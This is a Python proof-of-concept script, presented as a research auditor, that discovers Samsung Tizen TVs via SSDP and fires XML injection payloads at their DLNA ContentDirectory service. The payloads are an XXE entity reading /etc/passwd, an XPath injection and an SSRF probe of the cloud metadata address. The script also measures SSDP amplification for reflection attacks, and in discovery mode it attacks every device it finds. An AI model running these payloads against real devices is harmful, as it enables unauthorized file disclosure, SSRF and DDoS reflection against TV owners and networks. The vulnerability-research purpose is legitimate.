#!/usr/bin/env python3
"""
Samsung Tizen UPnP/DLNA XML Injection Auditor
===============================================
PoC for TIZEN-2026-003 (UPnP/DLNA XML Injection)

Discovers Samsung TVs via SSDP, fetches device description XML,
and tests for XML injection vulnerabilities in DLNA content browsing.

Usage:
    python3 tizen_upnp_audit.py --target <TV_IP>
    python3 tizen_upnp_audit.py --discover

Author: Andre Henrique (@mrhenrike) | Uniao Geek — https://github.com/Uniao-Geek
Research ID: TIZEN-2026-003
"""
import argparse
import os
import socket
import sys
import time
import tempfile
import json
import re
import urllib.request
import urllib.parse
from xml.etree import ElementTree as ET

# --- Ensure temp dir is inside project ---
_project_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", ".tmp")
os.makedirs(_project_tmp, exist_ok=True)
tempfile.tempdir = _project_tmp

SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900
UPNP_PORTS = (7676, 9197, 52235, 55000, 8080)
TIMEOUT = 4.0

SSDP_MSEARCH = (
    "M-SEARCH * HTTP/1.1\r\n"
    f"HOST: {SSDP_ADDR}:{SSDP_PORT}\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "ST: urn:samsung.com:device:RemoteControlReceiver:1\r\n"
    "MX: 3\r\n\r\n"
).encode()

SSDP_MSEARCH_ALL = (
    "M-SEARCH * HTTP/1.1\r\n"
    f"HOST: {SSDP_ADDR}:{SSDP_PORT}\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "ST: ssdp:all\r\n"
    "MX: 3\r\n\r\n"
).encode()

# XML injection payloads for DLNA ContentDirectory Browse
INJECTION_PAYLOADS = [
    ('XXE basic',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
     '<s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">'
     '<ObjectID>&xxe;</ObjectID><BrowseFlag>BrowseDirectChildren</BrowseFlag>'
     '<Filter>*</Filter><StartingIndex>0</StartingIndex><RequestedCount>10</RequestedCount>'
     '</u:Browse></s:Body></s:Envelope>'),

    ('XPath injection',
     '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
     '<s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">'
     "<ObjectID>' or '1'='1</ObjectID><BrowseFlag>BrowseDirectChildren</BrowseFlag>"
     '<Filter>*</Filter><StartingIndex>0</StartingIndex><RequestedCount>10</RequestedCount>'
     '</u:Browse></s:Body></s:Envelope>'),

    ('SSRF via controlURL',
     '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
     '<s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1">'
     '<ObjectID>http://169.254.169.254/latest/meta-data/</ObjectID>'
     '<BrowseFlag>BrowseDirectChildren</BrowseFlag>'
     '<Filter>*</Filter><StartingIndex>0</StartingIndex><RequestedCount>10</RequestedCount>'
     '</u:Browse></s:Body></s:Envelope>'),
]


def ssdp_discover(timeout: float = 5.0) -> list[dict]:
    """Discover Samsung TVs via SSDP on local network."""
    found = []
    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(timeout)
    sock.sendto(SSDP_MSEARCH_ALL, (SSDP_ADDR, SSDP_PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(65536)
            resp = data.decode(errors="replace")
            if "samsung" in resp.lower() or "tizen" in resp.lower():
                location = re.search(r"LOCATION:\s*(.+)", resp, re.IGNORECASE)
                server   = re.search(r"SERVER:\s*(.+)",   resp, re.IGNORECASE)
                st       = re.search(r"ST:\s*(.+)",       resp, re.IGNORECASE)
                entry = {
                    "ip":       addr[0],
                    "location": location.group(1).strip() if location else "",
                    "server":   server.group(1).strip()   if server   else "",
                    "st":       st.group(1).strip()       if st       else "",
                }
                if not any(e["ip"] == addr[0] for e in found):
                    found.append(entry)
        except socket.timeout:
            break
        except Exception:
            continue
    sock.close()
    return found


def fetch_device_desc(location: str) -> dict | None:
    """Fetch and parse UPnP device description XML."""
    try:
        with urllib.request.urlopen(location, timeout=TIMEOUT) as resp:
            data = resp.read()
        root   = ET.fromstring(data)
        ns     = {"": "urn:schemas-upnp-org:device-1-0"}
        device = root.find("device", ns) or root.find("{urn:schemas-upnp-org:device-1-0}device")
        if device is None:
            return {"raw_xml": data.decode(errors="replace")[:2000]}
        info = {}
        for tag in ("deviceType", "friendlyName", "manufacturer", "modelName",
                    "modelNumber", "serialNumber", "UDN", "presentationURL"):
            el = (device.find(tag, ns) or
                  device.find(f"{{urn:schemas-upnp-org:device-1-0}}{tag}"))
            if el is not None and el.text:
                info[tag] = el.text.strip()
        services = []
        for svc in root.iter("{urn:schemas-upnp-org:device-1-0}service"):
            srv_info = {}
            for t in ("serviceType", "serviceId", "controlURL", "SCPDURL"):
                el = svc.find(f"{{urn:schemas-upnp-org:device-1-0}}{t}")
                if el is not None:
                    srv_info[t] = el.text.strip()
            if srv_info:
                services.append(srv_info)
        info["services"] = services
        return info
    except Exception as e:
        return {"error": str(e)}


def soap_request(host: str, port: int, path: str, service_type: str,
                 action: str, body_xml: str) -> str:
    """Send a SOAP/UPnP action request."""
    headers = {
        "Content-Type": "text/xml; charset=\"utf-8\"",
        "SOAPAction":   f'"{service_type}#{action}"',
        "User-Agent":   "UPnP/1.0",
    }
    url = f"http://{host}:{port}{path}"
    req = urllib.request.Request(url, data=body_xml.encode(), headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")
    except Exception as e:
        return str(e)


def test_injection(host: str, port: int, control_url: str) -> list[dict]:
    """Test XML injection payloads against ContentDirectory Browse."""
    results = []
    service = "urn:schemas-upnp-org:service:ContentDirectory:1"
    for name, payload in INJECTION_PAYLOADS:
        resp = soap_request(host, port, control_url, service, "Browse", payload)
        finding = {
            "payload_name": name,
            "response_len": len(resp),
            "response_preview": resp[:500],
            "indicators": [],
        }
        if "root:x:0:0" in resp or "/bin/sh" in resp:
            finding["indicators"].append("XXE_FILESYSTEM_READ — /etc/passwd leaked!")
        if "169.254.169.254" in resp or "meta-data" in resp:
            finding["indicators"].append("SSRF — cloud metadata endpoint responded!")
        if "xmlns" in resp and "error" not in resp.lower():
            finding["indicators"].append("XML_RESPONSE — server processed injected XML")
        if "sql" in resp.lower() or "xpath" in resp.lower():
            finding["indicators"].append("INJECTION_ERROR — injection syntax reflected in error")
        results.append(finding)
    return results


def measure_amplification(target: str) -> dict:
    """Measure SSDP amplification factor (TIZEN-2026-004)."""
    probe = SSDP_MSEARCH_ALL
    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.settimeout(3.0)
    sock.sendto(probe, (target, SSDP_PORT))
    responses = []
    try:
        while True:
            data, _ = sock.recvfrom(65536)
            responses.append(len(data))
    except socket.timeout:
        pass
    sock.close()
    total_resp = sum(responses)
    factor     = total_resp / len(probe) if responses else 0
    return {
        "probe_bytes":    len(probe),
        "response_bytes": total_resp,
        "response_count": len(responses),
        "amplification_factor": round(factor, 2),
        "vulnerable": factor > 2.0,
    }


def audit_target(target: str, verbose: bool = False) -> dict:
    """Full UPnP/DLNA audit of a single target."""
    print(f"\n[*] UPnP/DLNA Audit — {target}")
    print("="*55)
    result = {
        "target":         target,
        "timestamp":      time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "device_desc":    None,
        "injection_tests": [],
        "amplification":  None,
        "findings":       [],
    }

    # SSDP Amplification test
    print(f"  [*] SSDP amplification test (TIZEN-2026-004)...")
    amp = measure_amplification(target)
    result["amplification"] = amp
    if amp["vulnerable"]:
        result["findings"].append({
            "id":       "TIZEN-2026-004",
            "severity": "MEDIUM",
            "title":    "SSDP Amplification",
            "evidence": f"Factor: {amp['amplification_factor']}x ({amp['probe_bytes']}B → {amp['response_bytes']}B)",
        })
        print(f"  [+] SSDP amplification: {amp['amplification_factor']}x")
    else:
        print(f"  [-] No SSDP amplification detected")

    # Find UPnP description URL
    desc_url = None
    for port in UPNP_PORTS:
        for path in ("/description.xml", "/desc.xml", "/rootDesc.xml", "/DeviceDesc.xml"):
            url = f"http://{target}:{port}{path}"
            try:
                with urllib.request.urlopen(url, timeout=2.0) as r:
                    desc_url = url
                    break
            except Exception:
                pass
        if desc_url:
            break

    if not desc_url:
        # Try from SSDP location
        disc = ssdp_discover(timeout=3.0)
        for d in disc:
            if d["ip"] == target and d["location"]:
                desc_url = d["location"]
                break

    if desc_url:
        print(f"  [+] Device description: {desc_url}")
        desc = fetch_device_desc(desc_url)
        result["device_desc"] = desc
        if verbose and desc:
            print(f"      Model: {desc.get('modelName','?')}")
            print(f"      Services: {[s.get('serviceType','?') for s in desc.get('services',[])]}")

        # Test injection on ContentDirectory services
        for svc in desc.get("services", []):
            if "ContentDirectory" in svc.get("serviceType", ""):
                ctrl_url = svc.get("controlURL", "")
                if ctrl_url:
                    parsed   = urllib.parse.urlparse(desc_url)
                    host_url = f"{parsed.scheme}://{parsed.netloc}"
                    port_url = parsed.port or 80
                    path_url = ctrl_url if ctrl_url.startswith("/") else f"/{ctrl_url}"
                    print(f"  [*] Testing XML injection on ContentDirectory...")
                    inj_results = test_injection(parsed.hostname, port_url, path_url)
                    result["injection_tests"] = inj_results
                    for r in inj_results:
                        if r["indicators"]:
                            result["findings"].append({
                                "id":       "TIZEN-2026-003",
                                "severity": "HIGH",
                                "title":    f"UPnP XML Injection — {r['payload_name']}",
                                "evidence": "; ".join(r["indicators"]),
                            })
                            print(f"  [!] INJECTION SUCCESS: {r['payload_name']}")
                            for ind in r["indicators"]:
                                print(f"      {ind}")
    else:
        print(f"  [-] No UPnP device description found on {target}")

    print(f"\n  Findings: {len(result['findings'])}")
    for f in result["findings"]:
        print(f"    [{f['severity']}] {f['id']}: {f['title']}")

    return result


def main():
    parser = argparse.ArgumentParser(description="Samsung Tizen UPnP/DLNA XML Injection Auditor")
    group  = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target",   help="Single TV IP address")
    group.add_argument("--discover", action="store_true", help="SSDP discovery on local network")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--output",  "-o", help="Output JSON file")
    args = parser.parse_args()

    if args.discover:
        print("[*] Discovering Samsung TVs via SSDP...")
        devices = ssdp_discover(timeout=5.0)
        print(f"    Found {len(devices)} Samsung/Tizen devices:")
        for d in devices:
            print(f"    {d['ip']:20s}  {d['server']}")
        results = [audit_target(d["ip"], args.verbose) for d in devices]
    else:
        results = [audit_target(args.target, args.verbose)]

    out_path = args.output or os.path.join(_project_tmp, "tizen_upnp_audit.json")
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[*] Results saved: {out_path}")


if __name__ == "__main__":
    main()
